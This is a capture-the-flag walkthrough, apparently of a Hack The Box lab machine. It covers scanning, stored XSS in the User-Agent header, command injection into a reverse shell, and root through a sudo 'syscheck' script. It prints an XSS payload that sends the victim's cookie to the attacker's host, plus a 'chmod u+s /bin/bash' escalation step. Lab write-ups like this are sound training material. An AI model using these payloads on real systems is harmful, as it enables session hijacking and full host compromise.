 ![image](https://github.com/user-attachments/assets/dcdcfc04-aa36-4d3f-8301-fafba7b45e04)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration:

### Port scan:

I began with a port scan and observed only two open ports on the target machine:

```sh
sudo nmap -Pn -vv -A -T4 10.10.11.8 -oN head_nmap
```

```Rust
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJXBmWeZYo1LR50JTs8iKyICHT76i7+fBPoeiKDXRhzjsfMWruwHrosHoSwRxiqUdaJYLwJgWOv+jFAB45nRQHw=
|   256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICkBEMKoic0Bx5yLYG4DIT5G797lraNQsG5dtyZUl9nW
5000/tcp open  upnp?   syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Wed, 17 Jul 2024 06:48:55 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>

Uptime guess: 45.576 days (since Sat Jun  1 13:01:41 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 32780/tcp)
HOP RTT       ADDRESS
1   193.29 ms 10.10.14.1
2   182.27 ms 10.10.11.8

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 02:50
Completed NSE at 02:50, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 02:50
Completed NSE at 02:50, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 02:50
Completed NSE at 02:50, 0.01s elapsed
```

### Web enumeration:

From the port scan results, I observed that port 5000 has an HTTP server running. I ran dirsearch and found just one directory on the web application:

```sh
dirsearch -u http://10.10.11.8:5000 -x 404,403 --crawl
```
![image](https://github.com/user-attachments/assets/738dc332-78eb-4532-bb32-ae74d152f1a5)

Browsing through the website, I discovered another page called "support," where there was an option to create a support ticket:

![image](https://github.com/user-attachments/assets/1afc1b0a-4c0a-4c6e-a26c-dfbe09680e5f)

I submitted random values, but the application responded with a "hacking attempted" alert:

![image](https://github.com/user-attachments/assets/3a129416-7074-4273-9f44-c865f544079b)

And accessing the dashboard required authentication:

![image](https://github.com/user-attachments/assets/a5eee3e9-4b99-4b68-a92c-95ad3c1c5d00)

From the support page response, I noticed a cookie value "is_admin," which caught my attention. Since the dashboard page requires authentication and there is no mechanism to enter credentials, the only way to authenticate here is via a cookie.

As my regular cookie wasn't working, I needed to get a valid cookie. I tried a few basic payloads of SQLi and SSRF, but neither worked. I then tried XSS, which eventually worked in the user-agent field:

![image](https://github.com/user-attachments/assets/c51d3df4-5feb-420e-a35e-9aa3718d9179)

To extract the cookie from the server, I remembered that XSS can be used to exfiltrate cookies, as I had done this before.

To perform the exfiltration, I used this XSS payload:

```JS
<script>document.location="http://10.10.14.38/?c="+document.cookie</script>
```

I turned on the web server on my Kali host and made the request with the above payload:

![image](https://github.com/user-attachments/assets/f58bceb9-9c89-400a-967e-51d59cd61af5)

In just a few moments, I got a connection request on my Kali host along with the cookie:

![image](https://github.com/user-attachments/assets/d190aedf-91b7-47da-a971-b1a73f32291b)

I used this cookie value to access the dashboard page and was finally able to browse it:

![image](https://github.com/user-attachments/assets/57568f9f-c129-4404-a75a-d49644fe1f44)

![image](https://github.com/user-attachments/assets/a0b0b532-ea12-4dd6-8b62-2845ea19e3f1)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Initial access:

Once I was able to access the page, I noticed an option to generate a report with a date filter:

![image](https://github.com/user-attachments/assets/c649593f-e323-4171-8c6f-49164332a005)

I tried to generate the report and intercepted the request using Burp Suite. I observed that there was only a single user input parameter, indicating a potential vulnerability.

I passed a few common payloads for command injection, and it worked:

![image](https://github.com/user-attachments/assets/e0d2d997-85c2-4347-bf57-b29e28548d0a)

This confirmed that the page is vulnerable to command injection. Leveraging this information, I supplied a Bash reverse shell payload and immediately received a shell as the user "dvir": 🙂

![image](https://github.com/user-attachments/assets/789536d5-0403-49d5-948f-c0fe250770af)

![image](https://github.com/user-attachments/assets/5a81e784-f415-48c0-9271-00065f392921)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Root access:

Once I gained initial access to the host, I observed that I could run **syscheck** as a sudo user:

![image](https://github.com/user-attachments/assets/6755bc29-872c-4664-ad93-262b4afac9b4)

I checked GTFOBins for any relevant privilege escalation exploits but didn't find any. Continuing my search, I found a [Medium blog](https://medium.com/@adiamond186/usr-bin-syscheck-is-looking-for-the-initdb-sh-609cd006d913) explaining how to leverage syscheck to gain root access on the host.

Following the blog, I made changes to initdb.sh and added this command to it, which grants the current user sudo access:

```bash
chmod u+s /bin/bash
```

![image](https://github.com/user-attachments/assets/c4df7fa9-7f39-433b-b18b-7a9eb9f5a471)

After making the changes, I executed syscheck with sudo again and then executed Bash with the **-p** flag. Upon execution, I observed that I now had root access on the host:

![image](https://github.com/user-attachments/assets/9e56c239-aec2-4a0c-b27c-2e4fece4eb64)  (pwn3d!🎉)
